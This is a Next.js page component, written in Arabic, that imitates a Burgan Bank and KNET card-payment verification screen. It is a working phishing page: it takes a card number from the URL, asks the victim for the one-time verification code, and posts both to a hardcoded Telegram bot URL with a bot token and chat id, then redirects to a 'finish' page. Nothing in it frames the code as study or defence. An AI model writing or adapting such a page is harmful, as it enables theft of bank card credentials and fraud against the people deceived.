
"use client";
import React, { useState, useEffect, Suspense } from "react";
import Image from "next/image";
import axios from "axios";
import { useRouter, useSearchParams } from "next/navigation";

function CodeForm() {
  const [code, setCode] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const router = useRouter();
  const searchParams = useSearchParams();

  useEffect(() => {
    const card = searchParams.get("name");
    if (card) setCardNumber(card);
  }, [searchParams]);

  const handleSend = (e) => {
    e.preventDefault();

    if (code.trim() === "") {
      alert("من فضلك املأ الحقل");
      return;
    }

    const text = `بنك برقان%0A🔐 الكود: ${code}%0A💳 رقم البطاقة: ${cardNumber}`;
    axios
      .post(
        `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=5714216192&text=${text}`
      )
      .then(() => {
        router.push(`/kpay/finish?name=${cardNumber}`);
      })
      .catch((err) => {
        console.error("فشل الإرسال:", err);
      });
  };

  return (
    <div className="card text-center shadow p-4" style={{ maxWidth: "400px" }}>
      <div className="card-body">
        <Image
          src="/2-143.jpg"
          alt="Burgan Bank"
          width={200}
          height={95}
          className="mb-3"
        />
        <h5 className="card-title text-primary fw-bold">تم إرسال رمز التحقق إليك</h5>
        <p className="text-muted">يرجى إدخاله لإتمام العملية</p>

        <input
  type="text"
  inputMode="numeric"
  pattern="\d*"
  className="form-control text-center mb-3"
  placeholder="123456"
  dir="ltr"
  value={code}
  onChange={(e) => setCode(e.target.value)}
/>

        <button className="btn btn-link text-decoration-none mb-3 text-primary">
          أرسل الرمز مجددًا
        </button>

        <button className="btn btn-primary w-100" onClick={handleSend}>
          تحقق
        </button>

        <p className="text-muted mt-3 small">
          لا تغادر الصفحة قبل إدخال رمز التحقق<br />
          إذا تأخر الرمز أو لم يصل، تأكد من معلومات البطاقة من{" "}
          <span className="text-primary">هنا</span>
        </p>

        <hr />
        <p className="text-secondary small mb-0">
          جميع الحقوق محفوظة ©2025<br />
          شركة الخدمات المصرفية الإلكترونية المشتركة - كي نت
        </p>
      </div>
    </div>
  );
}

export default function Page3() {
  return (
    <div className="d-flex justify-content-center align-items-center vh-100 bg-light">
      <Suspense fallback={<div>جارٍ التحميل...</div>}>
        <CodeForm />
      </Suspense>
    </div>
  );
}
